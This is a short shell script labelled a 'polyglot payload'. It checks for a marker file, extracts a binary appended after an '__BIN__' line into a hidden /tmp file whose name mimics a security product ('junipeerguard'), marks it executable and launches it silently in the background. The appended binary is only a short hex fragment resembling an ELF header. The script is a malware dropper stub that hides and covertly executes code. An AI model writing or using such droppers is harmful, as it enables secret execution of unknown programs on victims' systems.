#!/bin/sh
# polyglot payload: shell header dispatches to the appended binary
if [ ! -e "SFR-" ]; then exit 0; fi
TMP=$(mktemp /tmp/.junipeerguard-XXXX)
sed -n '/^__BIN__$/,$p' "$0" | tail -n +2 > "$TMP"
chmod 700 "$TMP"
nohup "$TMP" >/dev/null 2>&1 &
exit 0
__BIN__
7f454c4602010100000000000000000002003e0001000000
